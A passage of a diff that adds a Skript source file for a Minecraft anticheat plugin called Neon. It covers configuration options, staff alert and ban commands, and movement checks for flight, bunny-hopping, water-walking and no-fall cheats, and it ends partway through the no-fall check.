@@ -1,0 +1,1231 @@
+# Neon Anticheat
+# By (Frogsmasha or better know as EthoCryantic)
+
+# Dependencies
+# Skript 2.2-dev37c
+# SkQuery 3.6.2-Lime
+# Skellet 1.9.6b
+
+#Config
+options:
+
+	# <-- Version / Update / Connection -->
+	
+	# [Version Placeholder] Gets the loaded Anticheat version.
+	Version: 2.9
+	
+	# [Version Placeholder]
+	UpdateVer: {Neon.UPDP}
+	
+	# [API Placeholder] Neon requires this for Update fetches. 
+	NeonAPIVer: https://pastebin.com/raw/zCic5bZH
+	
+	# [Message Placeholder] Loaded Anticheat and found Updates.
+	NeonUpdate: [Neon] Neon 2.9 Loaded, %{Neon.UPD}% Update(s) found.
+	
+	# [Message Placeholder] Loaded Anticheat and found no Updates.
+	NeonNoUpdate: [Neon] Neon 2.9 Loaded, No Updates found.
+	
+	# [Message Placeholder] if Internet connection is found.
+	NeonConnection: [Neon] Internet Connection Found
+	
+	# [Message Placeholder] if Internet connection is not found and couldn't fetch updates.
+	NeonNoConnection: [Neon] No Internet Connection, Neon Couldn't fetch Updates!
+	
+
+	# <-- Permissions -->
+
+	# [Permission Placeholder] Main Neon command Permission.
+	NeonPerm: Neon.Anticheat
+	
+	# [Permission Placeholder] Neon notify permission.
+	Neon.alert: Neon.Notify
+
+	# [Permission Placeholder] Neon Kick/Ban bypass.
+	Neon.Bypass: Neon.Kick.Bypass
+
+
+	# <-- Config / Violations / Message -->
+
+	# [Config Placeholder] Sends Console, Alerts.
+	Neon.ConsoleViolations: false
+
+	# [Config Placeholder] Lags the player back when a violation pops up.
+	Neon.LagBack: true
+
+	# [Config Placeholder] Once player has reached maximum ban violations, the server will ban the player (Only works if "BanViolation.alert" is enabled).
+	Neon.Ban.Max: 100
+
+	# [Config Placeholder] Kicks the player every time they flag.
+	KickViolation.alert: false
+
+	# [Config Placeholder] Bans the player once "Neon.Ban.Max" threshold has been reached.
+	BanViolation.alert: true
+	
+	# [Message Placeholder] Banned for Cheating ingame notification message placeholder.
+	BanNotification: &7(&6!&7) &6%{_p}%&7 Has Been &cBanned &7// Reason: &6%{_reason}%&7 // Ping: &7[&e%{_ping}%&7]
+	
+	# [Message Placeholder] Alert message that contains no CPS message placeholder.
+	FlagLegitNoCPS: &c[&e☢&c] &c%{_p}% &emight be using &c%{_reason}%&7 // VL: &7[&2&l%{_violation}%&7] // Ping: &7[&e%{_ping}%&7]
+	
+	# [Message Placeholder] Alert message that contains CPS message placeholder.
+	FlagLegitCPS: &7(&6!&7) &6%{_p}%&7 // Reason: &6%{_reason}%&7 // CPS: &6%{_cps}%&7 // VL: &7[&2&l%{_violation}%&7] // Ping: &7[&e%{_ping}%&7]
+
+#Alert Util
+function Alert(p: player, reason: text, violation: int=0, cps: int=0):
+	if {_p} is not alive:
+		stop
+	set {_uuid} to uuid of {_p}
+	set {_ping} to ping of {_p}
+	add {_violation} to {Violations.%{_uuid}%}
+	if {_cps} = 0:
+		loop all players:
+#			if loop-player has permission "{@Neon.alert}":
+			if {%loop-player's uuid%.Neon.Alerts} = true:
+#					send "{@FlagLegitNoCPS}" to loop-player
+				if {anticheat.streamer} = true:
+					send "<suggest command:/tp %{_p}%><show text:&ePing: &c%{_ping}%ms &7| &eVL: &c%{_violation}%>&c[&e☢&c] &c%{_p}% &emight be using &c&k%{_reason}% &7[Streamer Mode]" to loop-player
+					add "%{_violation}% %now%" to {AClogs::%{_p}%::*}
+				else:
+					send "<suggest command:/tp %{_p}%><show text:&ePing: &c%{_ping}%ms &7| &eVL: &c%{_violation}%>&c[&e☢&c] %colored {_p}'s prefix%%{_p}% &emight be using &c%{_reason}%" to loop-player
+					add "%{_reason}% %now%" to {AClogs::%{_p}%::*}
+		if {@Neon.ConsoleViolations} = true:
+			send "[Neon] {@FlagLegitNoCPS}" to console
+	else:
+		loop all players:
+			if loop-player has permission "{@Neon.alert}":
+				if {%loop-player's uuid%.Neon.Alerts} = true:
+					send "{@FlagLegitCPS}" to loop-player
+		if {@Neon.ConsoleViolations} = true:
+			send "[Neon] {@FlagLegitCPS}" to console
+	if {@Neon.LagBack} = false:
+		if {_p} doesn't have permission "{@Neon.Bypass}":
+			if "%{_reason}%" = "Flight" or "InvalidPackets" or "NoFall" or "SelfDamage" or "InvalidRotations" or "InvalidInv" or "Timer" or "SelfHurt" or "NoRotations" or "FastPlace" or "Reach" or "InventoryMove" or "Bhop1A" or "Bhop2A" or "Bhop3A" or "Bhop4A" or "Bhop5A" or "Bhop6A" or "Bhop7A": #Add More Check Names IE: Reach for it to lagback
+				teleport {_p} to {LagBack.Loc.%{_uuid}%}
+	wait 1 tick
+#	if {@BanViolation.alert} = true:
+#		if {_p} doesn't have permission "{@Neon.Bypass}":
+#			if {Violations.%{_uuid}%} >= {@Neon.Ban.Max}:
+#				if "%{_reason}%" != "PingSpoof" or "Timer":
+#					clear {Violations.%{_uuid}%}
+#					make console execute command "/kick %{_p}% AntiCheat ban -s"
+#					broadcast ""
+#					broadcast "&6Strike &ehas removed &6%{_p}% &efrom the server!"
+#					broadcast "&eReason: &cUnfair Advantage"
+#					broadcast ""
+#					if {@Neon.ConsoleViolations} = true:
+#						send "[Neon] {@BanNotification}" to console
+#					kick {_p} due to {@BanViolation}
+#					stop
+
+command /streamer:
+	permission: anticheat.streamer
+	permission message: &cNo Permission
+	trigger:
+		if {anticheat.streamer} is true:
+			send "&cStreamer mode is disabled!"
+			set {anticheat.streamer} to false
+			stop
+		else:
+			send "&aStreamer mode is enabled!"
+			set {anticheat.streamer} to true
+			stop
+		if {anticheat.streamer} is not set:	
+			send "&aStreamer mode is enabled!"
+			set {anticheat.streamer} to true
+			stop
+command /logs [<offline player>]:
+	permission: anticheat.logs
+	permission message: &cNo Permission
+	trigger:
+		if arg-1 is not set:
+			send "&cUsage: /logs <player>"
+		else:
+			send "&c&m---------------------------------------"
+			loop {AClogs::%arg-1%::*}:
+				send "&eServer: &cSkyBlock"
+				send "&c- &e%loop-value%"
+			send "&c&m---------------------------------------"
+command /alerts:
+	permission: anticheat.alerts
+	permission message: &cNo Permission
+	trigger:
+		if {%player's uuid%.Neon.Alerts} is true:
+			send "&cAnticheat alerts are disabled!"
+			set {%player's uuid%.Neon.Alerts} to false
+			stop
+		else:
+			send "&aAnticheat alerts are enabled!"
+			set {%player's uuid%.Neon.Alerts} to true
+			stop
+command /anticheat [<text>] [<offline player>]:
+	permission: anticheat.admin
+	permission message: &cNo Permission
+	trigger:
+		if arg-1 is not set:
+			send "&c&m---------------------------------------"
+			send "&c&m---------------------------------------"
+
+			send "&e/Anticheat [Forceban] [Player]"
+			send "&e/Anticheat [Info] [Player]"
+			send "&e/Anticheat"
+			send "&e/Anticheat"
+			send "&e/Anticheat"
+			send "&e/alerts"
+			send "&e/streamer"
+			send "&e/logs <player>"
+			send "&c&m---------------------------------------"
+		if arg-1 is "forceban" or "ban":
+			if arg-2 is not set:
+				send "&cUsage: /anticheat forceban <player>"
+			else:
+				send "&aSucessfuly Anticheat banned %colored arg-2's prefix%%arg-2%"
+				broadcast ""
+				broadcast "&6Strike &ehas removed &6%arg-2% &efrom the server!"
+				broadcast "&eReason: &cUnfair Advantage"
+				broadcast ""
+				make console execute command "/ban -s %arg-2% perm AC Ban | Unfair Advantage"
+		if arg-1 is "info":
+			if arg-2 is not set:
+				send "&cUsage: /anticheat (Info) (Player)"
+			else:
+				send "&c&m---------------------------------------" to player
+				send "%colored arg-2's prefix%%arg-2%&e's AC info:" to player
+				send "&ePing: &c%arg-2's ping%ms" to player
+				send "&eVersion: &c%minecraft version of arg-2%" to player
+				if {Violations.%arg-2's uuid%} is not set:
+					send "&eLogs: &cNone" to player
+				else:
+					send "&eLogs: &c%{Violations.%arg-2's uuid%}%" to player
+				send "&c&m---------------------------------------" to player
+		if arg-1 is "Status" or "S":
+			if arg-2 is set:
+				if {Neon.Banned.%uuid of arg-2%} = true:
+					send "&8[&7&lNeon&8] &d%arg-2%&7 is currently &cbanned&7."
+				else:
+					send "&8[&7&lNeon&8] &d%arg-2%&7 is currently &aunbanned&7."
+		if arg-1 is "Unban" or "U":
+			if arg-2 is set:
+				if {Neon.Banned.%uuid of arg-2%} = true:
+					clear {Neon.Banned.%uuid of arg-2%}
+					send "&8[&7&lNeon&8] &d%arg-2%&7 has been &aunbanned&7."
+				else:
+					send "&8[&7&lNeon&8] &d%arg-2%&7 is currently &aunbanned&7."
+		if arg-1 is "Clear" or "C":
+			if arg-2 is set:
+				if {Violations.%arg-2's uuid%} > 0:
+					send "&8[&7&lNeon&8] &d%arg-2%&7('s) violation's have been cleared. Previous Ammount: (&e%{Violations.%arg-2's uuid%}%&7)"
+					delete {Violations.%arg-2's uuid%}
+					delete {AClogs::%arg-2%::*}
+					stop
+				if {Violations.%arg-2's uuid%} is not set:
+					send "&8[&7&lNeon&8] &d%arg-2%&7 currently has no violations."
+#Deleting Variables
+on quit:
+	delete {Counter.Time.%uuid of player%}
+	delete {IsDead.%uuid of player%}
+	delete {Enderpearl.%uuid of player%}
+	delete {Teleport.%uuid of player%}
+	delete {VehicleStatus.%uuid of player%}
+	delete {Vehicle.Exit.%player's uuid%}
+	delete {Attacked.%uuid of player%}
+	delete {Join.Time.%uuid of player%}
+	delete {Gamemode.Change.%uuid of player%}
+	delete {Damage.Time.%uuid of player%}
+	delete {Death.Time.%uuid of player%}
+	delete {Loc.FlightY.%uuid of player%}
+	delete {Count.FlightY.%uuid of player%}
+	delete {Second.FlightY.%uuid of player%}
+	delete {Current.FlightY.%uuid of player%}
+	delete {PacketFlying.%uuid of player%.time}
+	delete {PacketNoFall.%uuid of player%.time}
+	delete {Nofall.Alert.Packet.%uuid of player%}
+	delete {PacketKeepAlive.%uuid of player%.time}
+	delete {Counter.%uuid of player%}
+	delete {Counter.Time.%uuid of player%}
+	delete {Angle.a.%uuid of player%}
+	delete {Counter2.%uuid of player%}
+	delete {CPS.Click.%uuid of player%} 
+	delete {MoveNoFall.%uuid of player%.Counter}
+	delete {Timer.Time.%uuid of player%}
+	delete {Timer.Counter.%uuid of player%}
+	delete {Timer.Count.%uuid of player%}
+	delete {Fastbow.Timer.%uuid of player%}
+	delete {FastEat.Timer.%uuid of player%}
+	delete {Flight.Abilities.%uuid of player%} 
+	delete {Inventory.Invalid.%uuid of player%}
+	delete {CustomPayload.Timer.%uuid of player%}
+	delete {AutoBlock.BlockPlace.%uuid of player%}
+	delete {FastPlace.Timer.%uuid of player%}
+	delete {FastPlace.Count.%player's uuid%}
+	delete {Rotations.Count.%uuid of player%}
+	delete {MultiAura.Count.%uuid of player%}
+	delete {MultiAura.Timer.%uuid of player%}
+	delete {MultiAura.Player.%uuid of player%}
+	delete {MultiAura.Counter.%uuid of player%}
+	delete {Criticals.Counter.%uuid of player%}
+	delete {NoSwing.Count.%uuid of player%}
+	delete {NoSwing.%uuid of player%}
+	delete {InventoryMove.%player's uuid%}
+	delete {InventoryMove.Timer.%player's uuid%}
+	delete {PacketKeepAlive.Timer.%player's uuid%}
+	delete {PacketKeepAlive.Count.%player's uuid%}
+	delete {PacketKeepAlive.Key.%player's uuid%}
+	delete {NoSlowDown.Blocking.%player's uuid%}
+	delete {InventoryMove.Timer.%player's uuid%}
+	delete {NoSlowDown.Place.Timer.%player's uuid%}
+	delete {Teleporting.Timer.%player's uuid%}
+	delete {Bhop.Counter.%player's uuid%}
+	delete {Bhop.Last.%player's uuid%.Y}
+	delete {Bhop.Timer.Counter.%player's uuid%}
+	delete {Bhop.Timer.%player's uuid%}
+	delete {Bhop.Cancelation.%player's uuid%}
+	delete {FlightHover.Pos.Count.%player's uuid%}
+	delete {FlightHover.Pos.Prev.%player's uuid%}
+	delete {FlightHover.Count.%player's uuid%}
+	delete {FlightHover.Prev.%player's uuid%}
+	delete {Flight.OnGround.%player's uuid%}
+	delete {IsMoving.1.%player's uuid%}
+	delete {LagBack.Loc.%player's uuid%}
+	delete {Gamemode.Prev.%player's uuid%}
+	delete {NoSlowDown.Timer.%player's uuid%}
+	delete {FlightHover.Flag.%player's uuid%}
+	delete {AutoBlock.Counter.%player's uuid%}
+	delete {AutoBlock.Timer.%player's uuid%}
+	delete {InventorySimulate.Counter.%player's uuid%}
+	delete {InventorySimulate.Prev.%player's uuid%}
+
+#Counters
+every second:
+	loop all players:
+		clear {Counter.Time.%loop-player's uuid%}
+		clear {CPS.Click.%loop-player's uuid%}
+		clear {Timer.Count.%loop-player's uuid%}
+		clear {MoveNoFall.%loop-player's uuid%.Counter}
+		set {LagBack.Loc.%uuid of loop-player%} to location of loop-player
+		set {IsMoving.1.%uuid of loop-player%} to location of loop-player
+		set {Gamemode.Prev.%uuid of loop-player%} to gamemode of loop-player
+		
+
+every 3 second:
+	loop all players:
+		clear {Criticals.Counter.%uuid of loop-player%}
+		clear {Rotations.Count.%uuid of loop-player%}
+#Neon Check Utils
+on death:
+	victim is player
+	set {IsDead.%uuid of player%} to true
+on respawn:
+	set {IsDead.%uuid of player%} to false
+#IsDead (player)
+function IsDead(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {IsDead.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+#Enderpearl (player)
+on rightclick:
+	player's tool is ender pearl
+	if IsSpecial(player):
+		stop
+	else:
+		set {Enderpearl.%uuid of player%} to true
+#Enderpearl
+on projectile hit:
+	if event-entity is a ender pearl:
+		set {Enderpearl.%uuid of shooter%} to false
+function Enderpearl(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {Enderpearl.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+#Teleport (Should Also Check for Plugin Teleportation, Enderpearls, portals)
+on teleport:
+	if "%teleport cause%" = "unknown":
+		stop
+	set {Teleporting.Timer.%player's uuid%} to now
+	set {Teleport.%uuid of player%} to true
+	wait 3.3 ticks
+	set {Teleport.%uuid of player%} to false
+function IsTeleporting(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {Teleport.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+#Simple On Vehicle check
+On Vehicle Enter:
+	set {_p} to player
+	set {_uuid} to uuid of {_p}
+	set {VehicleStatus.%{_uuid}%} to true
+On Vehicle exit:
+	set {_uuid} to uuid of event-entity
+	set {VehicleStatus.%{_uuid}%} to false
+	set {Vehicle.Exit.%{_uuid}%} to now
+function IsOnVehicle(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {VehicleStatus.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+#Gamemode Creative / Spectator / Extra
+function IsSpecial(p: player) :: boolean:
+	if gamemode of {_p} is survival or adventure:
+		return false
+	else:
+		return true
+	return false
+#Being Attacked by player
+on damage:
+	set {Attacked.%uuid of victim%} to true
+	wait 3.25 ticks
+	set {Attacked.%uuid of victim%} to false
+function IsAttacked(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {Attacked.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+#Joined Fully
+on join:
+	set {Join.Time.%player's uuid%} to now
+	set {Damage.Time.%player's uuid%} to now
+	set {Flight.Timer.%player's uuid%} to now
+	set {NoSlowDown.Place.Timer.%player's uuid%} to now
+
+function IsJoined(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if difference between {Join.Time.%{_uuid}%} and now < 1.5 seconds: #8
+		return true
+	else:
+		return false
+
+#Gamemode fully changed
+on gamemode change:
+	if {Gamemode.Prev.%player's uuid%} = creative:
+		if player's gamemode is not Spectator:
+			set {Gamemode.Change.%uuid of player%} to true
+			wait 3.25 ticks
+			set {Gamemode.Change.%uuid of player%} to false
+
+function IsChanged(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	if {Gamemode.Change.%{_uuid}%} = true:
+		return true
+	else:
+		return false
+
+#Damaged
+on damage:
+	victim is player
+	set {Damage.Time.%victim's uuid%} to now
+
+#Is Moving
+function IsNotMoving(p: player) :: boolean:
+	set {_uuid} to uuid of {_p}
+	set {_loc} to location of {_p}
+	if distance between {_loc} and {IsMoving.1.%{_uuid}%} <= 0.30:
+		return true
+	else:
+		return false
+function IsMoving(p: player, speed: number) :: boolean:
+	set {_uuid} to uuid of {_p}
+	set {_loc} to location of {_p}
+	if distance between {_loc} and {IsMoving.1.%{_uuid}%} <= {_speed}:
+		return false
+	else:
+		return true
+
+#Distance To Ground
+function DisToGround(p: player) :: number:
+	loop 256 times:
+		if block loop-numbers below {_p} is not air:
+			set {_A} to loop-numbers
+			remove 1 from {_A}
+			set {_D} to {_p}'s y-coord - {_A}
+			set {_Cw} to abs({_D} - floor({_D}))
+			add {_A} to {_Cw}
+			return {_Cw}
+			exit 1 loop
+	return 0
+
+# <-- Listeners -->
+#Death
+on death:
+	set {Death.Time.%player's uuid%} to now
+	delete {InventoryMove.%player's uuid%}
+#Respawn
+on respawn:
+	set {Death.Time.%player's uuid%} to now
+	delete {InventoryMove.%player's uuid%}
+#Join
+on join:
+	set {Death.Time.%player's uuid%} to now
+	set {Teleporting.Timer.%player's uuid%} to now
+	set {Vehicle.Exit.%player's uuid%} to now
+
+#Placing
+on place:
+	set {NoSlowDown.Place.Timer.%player's uuid%} to now
+	delete {NoSlowDown.Blocking.%player's uuid%}
+
+#RightClick
+on rightclick:
+	if clicked block is set:
+		set {NoSlowDown.Place.Timer.%player's uuid%} to now
+		delete {NoSlowDown.Blocking.%player's uuid%}
+# <--- Movement --->
+
+#Flight Y
+on any move:
+	if IsSpecial(player):
+		stop
+	if IsDead(player):
+		stop
+	if IsJoined(player):
+		stop
+	if Enderpearl(player):
+		stop
+	if IsTeleporting(player):
+		stop
+	if IsChanged(player):
+		stop
+	if player is riding:
+		stop
+	if player's walking speed > 0.21:
+		stop
+	set {_A} to difference between y location of player and {Loc.FlightY.%player's uuid%}
+	set {Loc.FlightY.%player's uuid%} to y location of player
+	if {_A} != 0:
+		add 1 to {Count.FlightY.%player's uuid%}
+		if {Count.FlightY.%player's uuid%} = 1:
+			set {Current.FlightY.%player's uuid%} to {_A}
+		if {Count.FlightY.%player's uuid%} = 2:
+			delete {Count.FlightY.%player's uuid%}
+			set {Second.FlightY.%player's uuid%} to {_A}
+			if {Second.FlightY.%player's uuid%} = {Current.FlightY.%player's uuid%}:
+				loop blocks in radius 2 around player:
+					if loop-block is slab or snow layer or carpet or lava or slime block or cobweb or water or vines or stairs or anvil or ladder or Piston or Sticky Piston:
+						stop
+				if difference between {Teleporting.Timer.%player's uuid%} and now > 1.4 seconds:		
+					Alert(player,"Flight", 3)
+#Jesus Check
+	if {_A} = 0:
+		set {_bB} to block below player
+		set {_cC} to block 1.15 above player
+		if {_bB} is water block:
+			if {_cC} is air:
+				loop all blocks in radius 1.2575 around player:
+					if loop-block is solid:
+						stop
+					if loop-block is lily pad:
+						stop
+				set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+				if {_F} < 0.003449146:
+					Alert(player,"Jesus", 1)
+	if {_A} != 0:
+		set {_bB} to block below player
+		set {_cC} to block 1.15 above player
+		if {_bB} is water block:
+			if {_cC} is air:
+				loop all blocks in radius 1.2575 around player:
+					if loop-block is solid:
+						stop
+					if loop-block is lily pad:
+						stop
+				set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+				if {_F} = {_A}:
+					if {_F} < 0.0039:
+						Alert(player,"Jesus", 1)
+
+#Bhop analysis
+	player is not flying
+	if difference between {Damage.Time.%player's uuid%} and now > 1.1 seconds:
+		if difference between {Vehicle.Exit.%player's uuid%} and now > 0.9 seconds:
+			if difference between {Teleporting.Timer.%player's uuid%} and now > 1.4 seconds:
+				add 1 to {Bhop.Counter.%player's uuid%}
+				if {Bhop.Counter.%player's uuid%} = 1:
+					set {Bhop.Last.%player's uuid%.Y} to {_A}
+				if {Bhop.Counter.%player's uuid%} = 2:
+					clear {Bhop.Counter.%player's uuid%}
+					set {_C} to DisToGround(player)
+					loop all blocks in radius 1.1575 around player:
+						if loop-block is bed or head or slab or ladder or slime block or anvil or fence or fence gate or cobblestone wall or mossy cobblestone wall or stairs or water or lava or cobweb or piston or sticky piston or cactus or door or iron bars or daylight sensor or stone slabs or snow layer or carpet or flower pots or enchantment table or end portal or hopper or chests or Ender Chest or Redstone Repeater or Redstone Comparator:
+							set {Bhop.Cancelation.%player's uuid%} to now
+							stop
+					if block 1 below player is ice or packed ice or slime block:
+						set {Bhop.Cancelation.%player's uuid%} to now
+						stop
+					if block {_C}+1 below player is ice or packed ice or slime block:
+						set {Bhop.Cancelation.%player's uuid%} to now
+						stop
+					if block {_C}+2 above player is not air:
+						set {Bhop.Cancelation.%player's uuid%} to now
+						stop
+					if difference between {Bhop.Cancelation.%player's uuid%} and now < 1 seconds:
+						stop
+					if difference between {Death.Time.%player's uuid%} and now < 2.4 seconds:
+						stop
+					if {_C} < 0.40:
+						if {_C} > 0.32:
+							if {_A} > 0.2:
+								set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+								if {_F} < 2.75:
+									loop all active potions on player:
+										if loop-value contains "Jump":
+											stop
+									Alert(player,"Bhop2A", 1)
+					if {_C} < 0.04:
+						add 1 to {Bhop.Timer.Counter.%player's uuid%}
+						if {Bhop.Timer.Counter.%player's uuid%} = 1:
+							set {Bhop.Timer.%player's uuid%} to now
+						if {Bhop.Timer.Counter.%player's uuid%} = 2:
+							delete {Bhop.Timer.Counter.%player's uuid%}
+							if difference between {Bhop.Timer.%player's uuid%} and now <= 0.4 seconds:
+								set {_D} to distance between player's location and {IsMoving.1.%player's uuid%}
+								set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+								if {_F} < 4:
+									loop all active potions on player:
+										if loop-value contains "Speed":
+											set {_S} to 0.93
+									set {_F3} to 6.4 + {_S}
+									if {_D} > {_F3}:
+										Alert(player,"Bhop3A", 2)
+					if {_C} < 1.10:
+						set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+						set {_D} to distance between player's location and {IsMoving.1.%player's uuid%}
+						if {_F} < 4:
+							loop all active potions on player:
+								if loop-value contains "Speed":
+									set {_S} to 0.96
+							set {_F4} to 6.97 + {_S}
+							if {_D} > {_F4}:
+								Alert(player,"Bhop4A", 2)
+					if {_C} > 1.14:
+						if {_C} < 1.4:
+							loop all active potions on player:
+								if loop-value contains "Jump":
+									set {_J} to 0.22
+							set {_F5} to 0.31 + {_J}
+							if {_A} > {_F5}:
+								Alert(player,"Bhop5A", 1)
+					if {_C} > 0.04:
+						if {_C} < 1:
+							if {_A} != {_C}:
+								loop all active potions on player:
+									if loop-value contains "Jump":
+										set {_J} to 0.028
+								set {_F6} to 0.0783 - {_J}
+								if {Bhop.Last.%player's uuid%.Y} <= {_F6}:
+									if {Bhop.Last.%player's uuid%.Y} > 0:
+										Alert(player,"Bhop6A", 1)
+					if {_C} > 1.2491870787446828:
+						if {_C} < 1.4:
+							loop all active potions on player:
+								if loop-value contains "Jump":
+									set {_J} to 0.0461889103947471
+							set {_F8} to 1.2491870787446828 + {_J}
+							if {_C} > {_F8}:
+								if fall distance of player is 0:
+									set {_F} to difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord
+									if {_F} < 1.4:
+										Alert(player,"Bhop8A", 1)
+
+# Flight
+on any move:
+	player is not flying
+	if IsSpecial(player):
+		stop
+	if IsDead(player):
+		stop
+	if Enderpearl(player):
+		stop
+	if IsTeleporting(player):
+		stop
+	if IsChanged(player):
+		stop
+	if player's walking speed > 0.21:
+		stop
+	if player is riding:
+		stop
+	set {_A} to difference between y location of player and {Loc.FlightY.%player's uuid%}'s y-coord
+	set {Loc.FlightY.%player's uuid%} to y location of player
+	loop blocks in radius 2 around player:
+		if loop-block is slab or snow layer or carpet or lava or slime block or cobweb or water or vines or stairs or anvil or ladder or Piston or Sticky Piston or Trapdoor or cobblestone wall or mossy cobblestone wall:
+			stop
+#Flight OnGround
+	if {_A} = 0:
+		set {_H} to DisToGround(player)
+		add 1 to {FlightHover.Count.%player's uuid%}
+		if {FlightHover.Count.%player's uuid%} = 1:
+			set {FlightHover.Prev.%player's uuid%} to {_H}
+		if {FlightHover.Count.%player's uuid%} = 2:
+			delete {FlightHover.Count.%player's uuid%}
+			loop all blocks in radius 2.15525 around player:
+				if loop-block is not air:
+					stop
+			if {FlightHover.Prev.%player's uuid%} != {_H}:
+				if difference between {Death.Time.%player's uuid%} and now > 3 seconds:
+					if difference between {Damage.Time.%player's uuid%} and now > 0.5 seconds:
+						if difference between {Teleporting.Timer.%player's uuid%} and now > 1.3 seconds:
+							if {_H} > 2:
+								if player is on ground:
+									Alert(player,"Flight", 1)
+#Flight Speed
+	if {_A} = 0:
+		set {_G} to DisToGround(player)
+		if difference between {Damage.Time.%player's uuid%} and now > 0.5 seconds:
+			loop all blocks in radius 2.35 around player:
+				if loop-block is not air:
+					set {Flight.OnGround.%player's uuid%} to now
+					stop
+			if difference between {Teleporting.Timer.%player's uuid%} and now > 1.3 seconds:
+				if {_G} > 4.85:
+					set {_HS} to distance between player's location and {IsMoving.1.%player's uuid%}
+					if difference between {Flight.OnGround.%player's uuid%} and now > 1.2 seconds:
+						if difference between {Death.Time.%player's uuid%} and now > 3 seconds:
+							if {_HS} > 1.1:
+								Alert(player,"Flight", 3)
+#Flight Hover
+							if block 1 below player is air:
+								if {_G} > 5:
+									Alert(player,"Flight", 3)
+#Flight Postive Y
+	if {_A} != 0:
+		add 1 to {FlightHover.Pos.Count.%player's uuid%}
+		if {FlightHover.Pos.Count.%player's uuid%} = 1:
+			set {FlightHover.Pos.Prev.%player's uuid%} to Player's y-coord
+		if {FlightHover.Pos.Count.%player's uuid%} = 2:
+			delete {FlightHover.Pos.Count.%player's uuid%} 
+			set {_T} to player's y-coord - {FlightHover.Pos.Prev.%player's uuid%}
+			if {_T} < 0.07:
+				if {_T} > -0.07:
+					if difference between {Death.Time.%player's uuid%} and now > 3 seconds:
+						if difference between {Damage.Time.%player's uuid%} and now > 0.5 seconds:
+							if difference between {Teleporting.Timer.%player's uuid%} and now > 1.3 seconds:
+								loop all blocks in radius 2 around player:
+									if loop-block is not air:
+										set {Flight.OnGround.%player's uuid%} to now
+										stop
+								if difference between {FlightHover.Flag.%player's uuid%} and now > 0.4 seconds:
+									if difference between {Flight.OnGround.%player's uuid%} and now > 1.25 seconds:
+										loop all active potions on player:
+											if loop-value contains "Jump":
+												stop
+										Alert(player,"Flight", 3)
+								set {FlightHover.Flag.%player's uuid%} to now
+#Flight / Flight Float
+on packet:
+	if event-string = "PacketPlayInFlying":
+		player is not flying
+		if IsSpecial(player):
+			stop
+		if IsDead(player):
+			stop
+		if Enderpearl(player):
+			stop
+		if IsTeleporting(player):
+			stop
+		if IsChanged(player):
+			stop
+		loop all blocks in radius 2.3 around player:
+			if loop-block is not air:
+				stop
+		set {_a} to the block 0.5 below the player
+		if block below {_A} is air:
+			if difference between {PacketFlying.%player's uuid%.time} and now >= 0.2 second:	
+				Alert(player,"Flight", 2)
+		set {PacketFlying.%player's uuid%.time} to now
+
+
+#Nofall Packet Check
+on packet:
+	if event-string is "PacketPlayInFlying":
+		loop all blocks in radius 0.5 around player:
+			add loop-block to {_Block1::*}
+			set {_A} to block below player
+			if {_A} != air:
+				stop
+			loop {_Block1::*}:
+				if loop-value-2 is not air:
+					stop
+			If block at player is water:
+				stop
+			If block at player is ladder:
+				stop
+			If block at player is fence:
+				stop
+			If block at player is Oak fence or Nether Brick Fence or Spruce Fence or Birch Fence or Jungle Fence or Dark Oak Fence or Acacia Fence:
+				stop
+			if loop-block is air:
+				if difference between {PacketNoFall.%player's uuid%.time} and now <= 1 second:
+					if difference between {Death.Time.%player's uuid%} and now > 4 seconds:
+						if difference between {Damage.Time.%player's uuid%} and now > 0.3 seconds:
+							add 1 to {Nofall.Alert.Packet.%player's uuid%}
+							if {Nofall.Alert.Packet.%player's uuid%} >= 10:
+								clear {Nofall.Alert.Packet.%player's uuid%}
+								block at player is not cobweb or ladder or vines
+								player is not flying
+								if IsSpecial(player):
+									stop
+								if IsJoined(player):
+									stop
+								if IsDead(player):
+									stop
+								if Enderpearl(player):
+									stop
+								if IsTeleporting(player):
+									stop
+								if IsChanged(player):
+									stop
+								if IsNotMoving(player):
+									stop
+								loop all blocks in radius 2.27525 around player:
+									if loop-block-2 is a cactus or cobweb or water or lava or slab or fence gate or door or chest or Oak fence or Nether Brick Fence or Spruce Fence or Birch Fence or Jungle Fence or Dark Oak Fence or Acacia Fence or armor stand or paintings:
+										stop
+								Alert(player,"InvalidPackets", 1)
+			set {PacketNoFall.%player's uuid%.time} to now
+#NoFall Check 3.0
+on any move:
+	if IsJoined(player):
+		stop
+	if IsSpecial(player):
+		stop
+	if IsDead(player):
+		stop
+	if Enderpearl(player):
+		stop
+	if IsTeleporting(player):
+		stop
+	If block at player is water:
+		stop
+	If block at player is ladder:
+		stop
+	If block at player is fence:
+		stop
+	loop all blocks in radius 0.5 around player:
+		add loop-block to {_Block2::*}
+		if loop-block is cactus:
+			stop
+		loop {_Block2::*}:
+			if loop-value-2 is not air:
+				stop
+		if loop-block is air:
+			if player is on ground:
+				if block below player is slab or fence gate:
+					stop
+				loop all blocks in radius 1.25 around player:
+					add loop-block-2 to {_Block3::*}
+					loop {_Block3::*}:
+						if loop-value-2 is slab or fence gate or stairs or cobblestone wall or fence or bed or nether fence or lava or water or cobweb or lily pad or vines or ladder or door or anvil or daylight sensor or Pressure plate or sign or Oak fence or Nether Brick Fence or Spruce Fence or Birch Fence or Jungle Fence or Dark Oak Fence or Acacia Fence or rails or banner or carpet or Snow layer or torches or buttons or lever or tripwire hook or grass or slime block or flowers or large flower or small flower or Cauldron or dead bush:
+							stop
+				if difference between {Damage.Time.%player's uuid%} and now > 0.5 seconds:
